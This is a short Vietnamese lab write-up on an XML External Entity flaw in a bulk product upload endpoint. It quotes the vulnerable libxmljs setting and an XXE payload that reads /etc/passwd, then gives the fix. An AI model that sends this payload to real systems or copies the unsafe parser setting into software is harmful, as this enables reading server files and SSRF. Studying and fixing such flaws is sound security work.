# A4 – XML External Entities (XXE)

## Scenario

- Upload XML sản phẩm hàng loạt: `/bulkproducts`

## Mô tả lỗ hổng

Parser XML được cấu hình với `noent: true` — cho phép resolve external entity. Attacker có thể đọc file hệ thống hoặc thực hiện SSRF.

## Khai thác

**Vị trí code (v1):** `core/appHandler.js` – hàm `bulkProducts`

```js
var products = libxmljs.parseXmlString(data, { noent: true, noblanks: true })
```

**Payload XML:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
  <product>
    <name>&xxe;</name>
    <code>P001</code>
    <tags>test</tags>
    <description>test</description>
  </product>
</products>
```

**Kết quả:** Nội dung `/etc/passwd` xuất hiện trong response.

## Tác động (Impact)

- Đọc file nội bộ server (`/etc/passwd`, config files, private keys)
- SSRF — gọi đến dịch vụ nội bộ không được expose ra ngoài

## Fix (v2)

```js
var products = libxmljs.parseXmlString(data, { noent: false, noblanks: true })
```

Tắt `noent` → external entity không được resolve.

## Kết quả sau fix

- Payload XXE trả về lỗi parse hoặc empty string
- Không thể đọc file hệ thống
